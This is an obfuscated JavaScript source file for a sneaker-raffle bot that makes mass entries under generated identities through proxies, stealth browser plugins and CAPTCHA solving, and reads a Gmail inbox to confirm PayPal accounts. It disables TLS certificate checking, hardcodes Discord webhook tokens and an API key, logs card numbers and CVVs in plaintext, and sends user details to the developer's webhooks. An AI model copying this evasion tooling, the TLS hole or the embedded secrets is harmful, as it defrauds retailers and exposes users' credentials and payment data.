process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x5d8933 = require('fs'), _0x2f99ca = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x57ee09(_0x402b29) {
    const _0xe5c465 = _0x5d8933['createWriteStream'](_0x402b29, { 'flags': 'a' }), _0x576a0a = console['log'];
    console['log'] = function () {
        const _0x1f100d = Array['prototype']['slice']['call'](arguments), _0x49f7a4 = _0x1f100d['join']('\x20') + '\x0a';
        _0xe5c465['write'](_0x49f7a4), _0x576a0a['apply'](console, _0x1f100d);
    };
}
_0x57ee09('../logs/log\x20' + _0x2f99ca);
var _0x168885 = require('tough-cookie'), _0x196441 = require('node-imap'), _0x3543e2 = require('util')['inspect'];
const _0x158053 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x2e15b7 } = require('discord.js');
var _0x54797d = require('exe');
const { execFile: _0x457de0 } = require('child_process'), _0x367f42 = require('puppeteer-extra'), _0x5ad8e2 = require('puppeteer-extra-plugin-recaptcha'), _0x156bf2 = require('puppeteer-extra-plugin-stealth'), _0x4e59da = require('chalk'), _0x4041fe = require('node-bash-title'), _0x577975 = require('axios'), _0x4d4612 = require('papaparse');
var _0x4f86b6 = require('random-name');
const _0x1d169b = require('request');
var _0x39af6d = require('prompt');
const _0x433f70 = _0x1d169b['jar']();
var _0x4acd48 = {};
const _0x35c9c4 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x4483bd = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x5b3f61 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x86cfad = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x3d3b23 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x90ce49 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x5ad6ac = 'https://discord.com/api/webhooks/', _0x6379d0 = '' + _0x5ad6ac + _0x5b3f61, _0x3faf08 = '' + _0x5ad6ac + _0x86cfad, _0x5640fd = '' + _0x5ad6ac + _0x35c9c4, _0x3b044a = '' + _0x5ad6ac + _0x4483bd, _0x1b595f = '' + _0x5ad6ac + _0x3d3b23, _0x121d8e = '' + _0x5ad6ac + _0x90ce49;
const _0x55cc3c = JSON['parse'](_0x5d8933['readFileSync']('../package.json', 'utf-8')), _0x5d34b4 = _0x55cc3c['version'];
var _0x22c4ed, _0x5a9fd8, _0x57acf6, _0x5edb98, _0x26572a, _0x1b7d51, _0xdaef84, _0x1a49a1;
const _0x221b34 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x3e2716 = ![];
const _0x1a4d7b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x1f3ffb = '0123456789';
var _0x321f2a = _0x1a4d7b['split']('');
const _0x5400ea = require('auto-git-update'), _0x2ef11e = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x12d6a2 = new _0x5400ea(_0x2ef11e);
async function _0x224931() {
    _0x26572a = _0x5d8933['readdirSync']('../proxies'), _0x5edb98 = _0x5d8933['readdirSync']('../tasks'), !_0x5d8933['existsSync']('../accounts/fenom.csv') && _0x5d8933['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x5d8933['existsSync']('../accounts/bstn.csv') && _0x5d8933['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x5d8933['existsSync']('../accounts/eql.csv') && _0x5d8933['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x5d8933['existsSync']('../failed-tasks.csv') && _0x5d8933['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x5d8933['existsSync']('../successful-tasks.csv') && _0x5d8933['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x4acd48 = JSON['parse'](_0x5d8933['readFileSync']('../settings.json', 'utf-8')), !_0x4acd48['delay'] && (_0x4acd48['delay'] = 0x3c, _0x5d8933['writeFileSync']('../settings.json', JSON['stringify'](_0x4acd48, null, 0x2))), !_0x4acd48['masterMail'] && (_0x4acd48['masterMail'] = 'yourmail@gmail.com', _0x5d8933['writeFileSync']('../settings.json', JSON['stringify'](_0x4acd48, null, 0x2))), !_0x4acd48['masterPassword'] && (_0x4acd48['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x5d8933['writeFileSync']('../settings.json', JSON['stringify'](_0x4acd48, null, 0x2))), !_0x4acd48['captchaKey'] && (_0x4acd48['captchaKey'] = '', _0x5d8933['writeFileSync']('../settings.json', JSON['stringify'](_0x4acd48, null, 0x2))), !_0x4acd48['useRandomProxy'] && (_0x4acd48['useRandomProxy'] = !![], _0x5d8933['writeFileSync']('../settings.json', JSON['stringify'](_0x4acd48, null, 0x2))), !_0x4acd48['shuffleTasks'] && (_0x4acd48['shuffleTasks'] = ![], _0x5d8933['writeFileSync']('../settings.json', JSON['stringify'](_0x4acd48, null, 0x2))), !_0x4acd48['webhook'] && (_0x4acd48['webhook'] = '', _0x5d8933['writeFileSync']('../settings.json', JSON['stringify'](_0x4acd48, null, 0x2))), _0x4acd48['delay'] <= 0x1388 && (_0x4acd48['delay'] = _0x4acd48['delay'] * 0x3e8), _0x4acd48['AfewDelay'] && (delete _0x4acd48['AfewDelay'], _0x5d8933['writeFileSync']('../settings.json', JSON['stringify'](_0x4acd48, null, 0x2))), _0x4acd48['MahaDelay'] && (delete _0x4acd48['MahaDelay'], _0x5d8933['writeFileSync']('../settings.json', JSON['stringify'](_0x4acd48, null, 0x2))), _0x4acd48['footshopDelay'] && (delete _0x4acd48['footshopDelay'], _0x5d8933['writeFileSync']('../settings.json', JSON['stringify'](_0x4acd48, null, 0x2))), _0x4acd48['MahaDelay'] = _0x4acd48['delay'], _0x5ad6ac = _0x4acd48['webhook'], _0x1b7d51 = _0x4acd48['licenseKey'];
}
let _0x2175ac, _0x3ee30b = [], _0x5b78a8;
const _0x505897 = _0x20a4b1 => new Promise(_0x3c136c => setTimeout(_0x3c136c, _0x20a4b1));
function _0x85b9a6(_0x4b3036, _0x4b99d3) {
    return Math['floor'](Math['random']() * (_0x4b99d3 - _0x4b3036 + 0x1) + _0x4b3036);
}
function _0x5598e4(_0x3266fd) {
    let _0x237abe = _0x3266fd['length'], _0x261d09;
    while (_0x237abe != 0x0) {
        _0x261d09 = Math['floor'](Math['random']() * _0x237abe), _0x237abe--, [_0x3266fd[_0x237abe], _0x3266fd[_0x261d09]] = [
            _0x3266fd[_0x261d09],
            _0x3266fd[_0x237abe]
        ];
    }
    return _0x3266fd;
}
async function _0x392d65(_0x5371f1) {
    return _0x577975['get']('https://api.hyper.co/v4/licenses/' + _0x5371f1, { 'headers': { 'Authorization': 'Bearer\x20' + _0x221b34 } })['then'](_0x5685fa => _0x5685fa['data'])['catch'](() => null);
}
;
async function _0x1c356a(_0x566dbb) {
    console['clear']();
    if (_0x566dbb == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x38d3de = await _0x39af6d['get']('License');
        if (_0x38d3de['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x505897(0xbb8), _0x1c356a(_0x566dbb);
        _0x566dbb = _0x38d3de['License'], _0x4acd48['licenseKey'] = _0x566dbb, _0x1b7d51 = _0x566dbb, _0x5d8933['writeFileSync']('../settings.json', JSON['stringify'](_0x4acd48));
    }
    console['log']('Checking\x20license\x20' + _0x1b7d51 + '...'), await _0x505897(0x320);
    const _0x48f863 = await _0x392d65(_0x566dbb);
    _0xdaef84 = JSON['stringify'](_0x48f863['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x1a49a1 = JSON['stringify'](_0x48f863['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x48f863)
        return console['log']('License\x20not\x20found');
    if (!_0x48f863['user'])
        return console['log']('License\x20not\x20bound');
    return _0x48f863['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x3e2716 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x3e2716 = ![]);
}
async function _0x51b098() {
    var _0x21d2c1 = await _0x39af6d['get']('Module');
    return console['clear'](), _0x21d2c1['Module'];
}
;
async function _0x4051f9() {
    var _0x2e01df = await _0x39af6d['get']('Setting');
    return console['clear'](), _0x2e01df['Setting'];
}
async function _0x1a71aa() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x5b4fd7 = 0x0; _0x5b4fd7 < _0x5edb98['length']; _0x5b4fd7++) {
        console['log']('\x20(' + _0x5b4fd7 + ')\x20' + _0x5edb98[_0x5b4fd7]);
    }
    console['log']('');
    var _0x1b310c = await _0x39af6d['get']('Task');
    if (_0x1b310c['Task'] > _0x5edb98['length'] - 0x1 || isNaN(_0x1b310c['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x505897(0x3e8), _0x1a71aa();
    var _0x552d33 = _0x5d8933['readFileSync']('../tasks/' + _0x5edb98[_0x1b310c['Task']], 'utf-8');
    return _0x57acf6 = _0x4d4612['parse'](_0x552d33, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x4e59da['blue'](_0x5edb98[_0x1b310c['Task']])), _0x22c4ed = _0x5edb98[_0x1b310c['Task']], _0x57acf6;
}
async function _0x2ab53c() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x511c53 = 0x0; _0x511c53 < _0x26572a['length']; _0x511c53++) {
        console['log']('\x20(' + _0x511c53 + ')\x20' + _0x26572a[_0x511c53]);
    }
    console['log']('');
    var _0x311827 = await _0x39af6d['get']('Proxies');
    if (_0x311827['Proxies'] > _0x26572a['length'] - 0x1 || isNaN(_0x311827['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x505897(0x3e8), _0x2ab53c();
    var _0x2684e0 = _0x5d8933['readFileSync']('../proxies/' + _0x26572a[_0x311827['Proxies']], 'utf-8')['split']('\x0a');
    let _0x306652 = _0x2684e0['map']((_0x50593c, _0x3939de) => {
        sanatizeProxy = _0x50593c['replace']('\x0d', '');
        if (_0x2684e0[_0x3939de + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x5a9fd8 = _0x26572a[_0x311827['Proxies']], console['clear'](), _0x306652;
}
async function _0x9f11ff() {
    var _0x5f5111 = await _0x39af6d['get']('Value');
    return console['clear'](), _0x5f5111['Value'];
}
async function _0x6885a(_0x4f2a3c) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x50b78b = 0x0; _0x50b78b < _0x4f2a3c['length']; _0x50b78b++) {
        console['log']('\x20(' + _0x50b78b + ')\x20[' + _0x4f2a3c[_0x50b78b]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x866f4 = await _0x39af6d['get']('Module');
    return _0x866f4['Module'];
}
async function _0x4bde0d() {
    var _0x26a325 = await _0x39af6d['get']('Password');
    return console['clear'](), _0x26a325['Password'];
}
;
async function _0x522729() {
    var _0x47ee79 = await _0x39af6d['get']('Links');
    return _0x47ee79['Links'];
}
;
async function _0x4ed524() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x155fae = 0x0; _0x155fae < _0x3ee30b['length']; _0x155fae++) {
        console['log']('\x20(' + _0x155fae + ')\x20' + _0x3ee30b[_0x155fae]);
    }
    ;
    console['log']();
    let _0x59b424 = await _0x39af6d['get']('Product');
    return console['clear'](), _0x59b424['Product'];
}
;
function _0x3b5c2b() {
    var _0x38a56f = new Date(Date['now']())['toLocaleTimeString']();
    return _0x38a56f;
}
;
function _0x38ca11() {
    var _0x11db0c = new Date(Date['now']())['toLocaleString']();
    return _0x11db0c['replace'](',', '');
}
async function _0x1abce0(_0x5be538, _0x37dcb3) {
    let _0xb1626d = { 'headers': { 'content-type': 'application/json' } };
    if (_0x5d34b4 != 'devkey') {
        await _0x577975['post'](_0x5be538, _0x37dcb3, _0xb1626d);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x429bf8(_0x485131, _0x39cc72, _0x4bc731, _0x6c0d9c, _0x423cee) {
    if (!_0x6c0d9c && _0x4bc731 == 'dev') {
        var _0x3f8029 = new _0x2e15b7()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x39cc72['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x39cc72['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x485131['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x4acd48['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0xdaef84,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x485131['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x485131['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x5d34b4,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x3f8029['data'];
    } else {
        if (_0x6c0d9c && _0x4bc731 == 'dev') {
            var _0x3f8029 = new _0x2e15b7()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x39cc72['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0xdaef84,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x39cc72['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x485131['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x4acd48['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x423cee,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x485131['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x485131['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x5d34b4,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x3f8029['data'];
        } else {
            if (_0x4bc731 == 'pub') {
                var _0x3f8029 = new _0x2e15b7()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x39cc72['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x39cc72['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x485131['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x4acd48['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x485131['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x5d34b4,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x3f8029['data'];
            } else {
                if (_0x4bc731 == 'acc' && !_0x6c0d9c) {
                    var _0x3f8029 = new _0x2e15b7()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x39cc72['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0xdaef84,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x39cc72['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x4acd48['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x5d34b4,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x3f8029['data'];
                } else {
                    if (_0x4bc731 == 'acc' && _0x6c0d9c) {
                        var _0x3f8029 = new _0x2e15b7()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x39cc72['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0xdaef84,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x423cee,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x39cc72['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x4acd48['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x5d34b4,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x3f8029['data'];
                    } else {
                        if (_0x4bc731 == 'open') {
                            var _0x3f8029 = new _0x2e15b7()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x1a49a1)['addFields']({
                                'name': 'User',
                                'value': '' + _0xdaef84,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x5d34b4,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x3f8029['data'];
                        } else {
                            if (!_0x6c0d9c && _0x4bc731 == 'ver') {
                                var _0x3f8029 = new _0x2e15b7()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x39cc72['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0xdaef84,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x39cc72['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x4acd48['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x5d34b4,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x3f8029['data'];
                            } else {
                                if (_0x6c0d9c && _0x4bc731 == 'ver') {
                                    var _0x3f8029 = new _0x2e15b7()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x39cc72['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0xdaef84,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x423cee,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x39cc72['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x4acd48['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x5d34b4,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x3f8029['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x43797b(_0x13b6d8, _0x4470c0) {
    var _0x5e1ca7 = _0x13b6d8[_0x4470c0]['Address1']['split'](''), _0x1c0476 = _0x13b6d8[_0x4470c0]['Address2']['split'](''), _0xe75fa0 = _0x13b6d8[_0x4470c0]['Email']['split']('@');
    for (var _0x187855 = 0x0; _0x187855 < _0x5e1ca7['length']; _0x187855++) {
        if (_0x5e1ca7[_0x187855] == 'X') {
            var _0x150319 = Math['round'](Math['random']() * (_0x1a4d7b['length'] - 0x1));
            _0x5e1ca7[_0x187855] = _0x321f2a[_0x150319];
        }
    }
    ;
    for (var _0x187855 = 0x0; _0x187855 < _0x1c0476['length']; _0x187855++) {
        if (_0x1c0476[_0x187855] == 'X') {
            var _0x150319 = Math['round'](Math['random']() * (_0x1a4d7b['length'] - 0x1));
            _0x1c0476[_0x187855] = _0x321f2a[_0x150319];
        }
    }
    ;
    _0x13b6d8[_0x4470c0]['FirstName'] == 'RANDOM' && (_0x13b6d8[_0x4470c0]['FirstName'] = _0x4f86b6['first']());
    _0x13b6d8[_0x4470c0]['LastName'] == 'RANDOM' && (_0x13b6d8[_0x4470c0]['LastName'] = _0x4f86b6['last']());
    _0xe75fa0[0x0] == 'RANDOM' ? _0xe75fa0[0x0] = '' + _0x4f86b6['first']() + _0x4f86b6['last']() + _0x85b9a6(0x1, 0x270f) + '@' : _0xe75fa0[0x0] = _0xe75fa0[0x0] + '@';
    _0x13b6d8[_0x4470c0]['Email'] = _0xe75fa0['join'](''), _0x13b6d8[_0x4470c0]['Address1'] = _0x5e1ca7['join'](''), _0x13b6d8[_0x4470c0]['Address2'] = _0x1c0476['join']('');
    _0x13b6d8[_0x4470c0]['Phone'] == 'RANDOM' && (_0x13b6d8[_0x4470c0]['Phone'] = '0' + _0x85b9a6(0x5f5e100, 0x3b9ac9ff));
    if (_0x13b6d8[_0x4470c0]['Follower'] == 'RANDOM') {
        var _0x43ea65 = _0x85b9a6(0x1, 0x270f);
        _0x13b6d8[_0x4470c0]['Follower'] = '' + _0x4f86b6['first']() + _0x4f86b6['last']() + _0x43ea65 + '\x20';
    }
    _0x13b6d8[_0x4470c0]['HouseNumber'] == 'RANDOM' && (_0x13b6d8[_0x4470c0]['HouseNumber'] = _0x85b9a6(0x1, 0xc8));
    if (_0x13b6d8[_0x4470c0]['Address1'] == 'RANDOM') {
        var _0x32560c = Math['round'](Math['random']() * (_0x1a4d7b['length'] - 0x1)), _0x62a44b = _0x321f2a[_0x32560c];
        _0x13b6d8[_0x4470c0]['Address1'] = _0x4f86b6['last']() + 'straat', _0x13b6d8[_0x4470c0]['Zip'] == '' && (_0x13b6d8[_0x4470c0]['Postcode'] = _0x85b9a6(0x3e8, 0x270f) + '\x20' + _0x62a44b + _0x62a44b, _0x13b6d8[_0x4470c0]['Zip'] = _0x13b6d8[_0x4470c0]['Postcode']), _0x13b6d8[_0x4470c0]['HouseNumber'] = '' + _0x85b9a6(0x1, 0xc8);
    }
    return;
}
;
async function _0x260c2d(_0x423d9c, _0x18c89f) {
    _0x5d8933['appendFileSync']('../failed-tasks.csv', _0x38ca11() + ',' + _0x18c89f['store'] + ',' + _0x18c89f['name'] + ',' + _0x423d9c['Url'] + ',' + _0x423d9c['Size'] + ',' + _0x423d9c['Follower'] + ',' + _0x423d9c['FirstName'] + ',' + _0x423d9c['LastName'] + ',' + _0x423d9c['Address1'] + ',' + _0x423d9c['Address2'] + ',' + _0x423d9c['HouseNumber'] + ',' + _0x423d9c['Zip'] + ',' + _0x423d9c['City'] + ',' + _0x423d9c['State'] + ',' + _0x423d9c['Country'] + ',' + _0x423d9c['Phone'] + ',' + _0x423d9c['Email'] + ',' + _0x423d9c['Password'] + ',' + _0x423d9c['PaymentMethod'] + ',' + _0x423d9c['CardType'] + ',' + _0x423d9c['NameOnCard'] + ',' + _0x423d9c['CardNumber'] + ',' + _0x423d9c['ExpiryDate'] + ',' + _0x423d9c['CVV'] + ',' + _0x423d9c['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x11df74(_0x5753ad, _0x319a83) {
    _0x5d8933['appendFileSync']('../successful-tasks.csv', _0x38ca11() + ',' + _0x319a83['store'] + ',' + _0x319a83['name'] + ',' + _0x5753ad['Url'] + ',' + _0x5753ad['Size'] + ',' + _0x5753ad['Follower'] + ',' + _0x5753ad['FirstName'] + ',' + _0x5753ad['LastName'] + ',' + _0x5753ad['Address1'] + ',' + _0x5753ad['Address2'] + ',' + _0x5753ad['HouseNumber'] + ',' + _0x5753ad['Zip'] + ',' + _0x5753ad['City'] + ',' + _0x5753ad['State'] + ',' + _0x5753ad['Country'] + ',' + _0x5753ad['Phone'] + ',' + _0x5753ad['Email'] + ',' + _0x5753ad['Password'] + ',' + _0x5753ad['PaymentMethod'] + ',' + _0x5753ad['CardType'] + ',' + _0x5753ad['NameOnCard'] + ',' + _0x5753ad['CardNumber'] + ',' + _0x5753ad['ExpiryDate'] + ',' + _0x5753ad['CVV'] + ',' + _0x5753ad['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x1e8b39() {
    let _0x2b1b99 = proxyFile['split']('\x0a'), _0x45d417 = _0x2b1b99['map']((_0x57c8bf, _0x8e41d0) => {
        sanatizeProxy = _0x57c8bf['replace']('\x0d', '');
        if (_0x2b1b99[_0x8e41d0 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x45d417;
}
;
async function _0x400d2d(_0x14282b, _0x17e624) {
    if (_0x27ea73 != 'yes')
        var _0x27ea73 = '', _0x3655db = 0x0;
    var _0x2a1448 = [];
    async function _0x291b6b() {
        console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify?');
        var _0x170c35 = await _0x39af6d['get']('Quantity')['Quantity'], _0x35b6c1 = new _0x196441({
            'user': _0x4acd48['masterMail'],
            'password': _0x4acd48['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x20df15(_0x3df5b0) {
            _0x35b6c1['openBox']('INBOX', ![], _0x3df5b0);
        }
        _0x35b6c1['once']('ready', function () {
            _0x20df15(function (_0x29c513, _0x31ce82) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x29c513)
                    throw _0x29c513;
                _0x35b6c1['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x17d57b, _0x11d7c7) {
                    if (!_0x11d7c7 || !_0x11d7c7['length'])
                        console['log'](_0x3b5c2b() + '\x20[' + _0x14282b['name'] + ']\x20No\x20mails\x20found'), _0x35b6c1['end']();
                    else {
                        var _0x23b1ad = _0x35b6c1['seq']['fetch'](_0x11d7c7, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x23b1ad['on']('message', function (_0x13f6f0, _0x58b4e3) {
                            var _0x475c4a = '(#' + _0x58b4e3 + ')\x20';
                            _0x13f6f0['on']('body', function (_0x20ca2b, _0xdac5a9) {
                                _0x158053(_0x20ca2b, (_0x284f17, _0xa90c34) => {
                                    if (_0xa90c34['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0xa90c34['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0xa90c34['text']['split']('[')[0x2];
                                        var _0x13be60 = mes['split'](']')[0x0];
